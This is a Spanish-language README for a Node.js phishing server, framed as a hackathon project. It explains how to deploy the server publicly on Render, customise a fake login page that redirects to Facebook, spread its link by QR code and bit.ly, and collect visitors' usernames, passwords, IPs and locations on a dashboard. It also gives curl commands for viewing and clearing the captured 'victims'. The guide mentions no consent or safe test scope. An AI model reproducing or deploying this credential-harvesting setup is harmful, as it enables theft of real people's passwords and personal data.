# 🎯 Phishing Server - Hackathon de Ciberseguridad

Servidor Node.js para capturar datos de phishing en entorno educativo.

## 📂 Estructura del Proyecto

```
phishing-server/
├── package.json          → Dependencias del proyecto
├── app.js               → Servidor principal (Node.js + Express)
├── .gitignore           → Archivos a ignorar en Git
├── public/              → Archivos públicos (HTML, CSS, JS)
│   ├── index.html       → Página de phishing (REEMPLAZA CON TU HTML)
│   └── dashboard.html   → Panel para ver víctimas capturadas
└── data/                → Carpeta para almacenar datos
    └── victims.json     → Se crea automáticamente
```

## 🚀 Instalación Local

### 1. Instalar Node.js
Descarga de: https://nodejs.org (versión 18 o superior)

### 2. Instalar dependencias
```bash
cd phishing-server
npm install
```

### 3. Iniciar servidor
```bash
npm start
```

El servidor estará en: http://localhost:3000

## 🌐 URLs Disponibles

- `http://localhost:3000/` → Info del servidor
- `http://localhost:3000/index.html` → Tu página de phishing
- `http://localhost:3000/dashboard.html` → Panel de administración
- `http://localhost:3000/api/victims` → Ver datos capturados (JSON)
- `http://localhost:3000/api/stats` → Estadísticas

## 📤 Subir a GitHub

```bash
git init
git add .
git commit -m "Initial phishing server setup"
git branch -M main
git remote add origin https://github.com/TU-USUARIO/TU-REPO.git
git push -u origin main
```

## ☁️ Deploy en Render.com

### 1. Crear cuenta en Render
- Ve a https://render.com
- Sign up con GitHub

### 2. Crear Web Service
- Click en "New +" → "Web Service"
- Conecta tu repositorio de GitHub
- Configuración:
  - **Name:** phishing-server-hackathon
  - **Environment:** Node
  - **Build Command:** `npm install`
  - **Start Command:** `npm start`
  - **Instance Type:** Free

### 3. Deploy
- Click "Create Web Service"
- Espera 2-3 minutos
- Tu URL será: `https://phishing-server-hackathon.onrender.com`

## 🎨 Personalizar el HTML

1. Abre `public/index.html`
2. Reemplaza todo el contenido entre `<body>` y `</body>` con tu diseño
3. Mantén el `<script>` al final que envía los datos
4. Cambia la URL de redirección en el JavaScript:
   ```javascript
   window.location.href = 'https://www.facebook.com'; // Cambia esto
   ```

## 📊 Ver las Víctimas Capturadas

**Opción 1: Dashboard Web**
- Abre: `https://tu-app.onrender.com/dashboard.html`
- Se actualiza automáticamente cada 5 segundos

**Opción 2: API JSON**
- Abre: `https://tu-app.onrender.com/api/victims`
- Verás el JSON con todos los datos

## 🔧 Datos que se Capturan

Cada víctima que entre a tu phishing se guardará con:
- ✅ Usuario y contraseña ingresados
- ✅ Dirección IP
- ✅ País, ciudad, región
- ✅ Navegador y sistema operativo
- ✅ Resolución de pantalla
- ✅ Idioma del navegador
- ✅ Fecha y hora exacta

## ⚠️ Importante sobre Render Free

- El servidor se "duerme" después de 15 minutos sin actividad
- Tarda ~30 segundos en despertar cuando alguien entra
- **Solución:** Antes del pitch, abre la URL para activarlo

## 🎯 Flujo del Hackathon

### HOY (Pitch):
1. Deploy el servidor en Render
2. Personaliza el HTML con tu diseño
3. Comparte la URL: `https://tu-app.onrender.com/index.html`
4. Genera un QR code de esa URL
5. Muéstralo en el pitch

### MAÑANA (Demo):
1. Abre: `https://tu-app.onrender.com/dashboard.html`
2. Muestra todas las víctimas capturadas en 24 horas
3. Explica los datos: IPs, ubicaciones, navegadores, etc.

## 🧪 Probar que Funciona

```bash
# Prueba 1: Verificar que el servidor responde
curl https://tu-app.onrender.com/

# Prueba 2: Enviar datos de prueba
curl -X POST https://tu-app.onrender.com/api/capture \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123"}'

# Prueba 3: Ver si se guardó
curl https://tu-app.onrender.com/api/victims
```

## 📱 Compartir en el Hackathon

### QR Code:
Usa: https://www.qr-code-generator.com
- Introduce tu URL
- Genera QR
- Imprime o muestra en pantalla

### URL Corta:
Usa: https://bit.ly
- Acorta tu URL de Render
- Más fácil de compartir verbalmente

## 🛠️ Comandos Útiles

```bash
# Ver logs en Render
# (Ve al dashboard de Render → Tu servicio → Logs)

# Limpiar datos capturados
curl -X DELETE https://tu-app.onrender.com/api/clear

# Ver estadísticas rápidas
curl https://tu-app.onrender.com/api/stats
```

## 💡 Tips para el Hackathon

1. **Prueba TODO antes del pitch** - No dejes nada para el último momento
2. **Ten un backup** - Descarga victims.json cada hora
3. **Monitorea desde el celular** - Abre el dashboard en tu teléfono
4. **Prepara la demo** - Practica cómo mostrarás los datos
5. **Screenshots** - Toma capturas de pantalla del dashboard funcionando

## 🆘 Solución de Problemas

**Error: "Cannot GET /"**
- El servidor está activo pero no encuentra la ruta
- Verifica que usas: `/index.html` al final de la URL

**No se guardan datos**
- Revisa los logs en Render
- Verifica que el formulario envíe a `/api/capture`
- Checa que CORS esté habilitado en app.js

**Render se duerme constantemente**
- Normal en plan Free
- Usa un servicio de "ping" como UptimeRobot para mantenerlo activo

## 📞 Soporte

Si tienes problemas:
1. Revisa los logs en Render
2. Verifica que los archivos estén en GitHub
3. Comprueba que `npm start` funcione localmente

---

**¡Suerte en el hackathon! 🚀**
